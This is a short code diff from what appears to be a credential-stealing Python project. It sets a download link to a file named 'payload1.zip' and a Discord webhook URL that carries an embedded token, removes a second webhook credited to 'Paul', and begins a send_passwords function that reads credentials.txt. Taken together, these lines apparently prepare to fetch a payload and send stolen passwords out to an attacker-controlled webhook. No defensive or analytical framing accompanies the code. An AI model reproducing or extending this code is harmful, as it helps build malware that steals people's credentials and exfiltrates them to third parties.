@@ -7,10 +7,9 @@ from logging_bot import log
 
 log("started main.py")
 
-download_link = "https://download1655.mediafire.com/ve9ey3rh72ag/t8vr5soxiv5ozvf/payload1.zip"
+#download_link = "https://download1655.mediafire.com/ve9ey3rh72ag/t8vr5soxiv5ozvf/payload1.zip" # link the mirror (this is old version)
+download_link = "https://download1655.mediafire.com/ve9ey3rh72ag/t8vr5soxiv5ozvf/payload1.zip" # link the mirror  (this is current version)
 webhook_url = "https://discordapp.com/api/webhooks/924328384492871700/0ZgV8H7BxLh9IUV2HGDHWLG842gFo_XmF3yhta1iXBR8hJ1kwh4Tif_NpCQf_hJtIoOM"
-# Pauls webhook #webhook_url = "https://discord.com/api/webhooks/923283787784261703/HaSpko88NVDvndZj2XZPcVNSrP5Pj5dsroyvrGwrJfQPeytewR-eDlNUOM_OtOG6LvU1"
-
 
 def send_passwords():
     f = open("credentials.txt", "r")
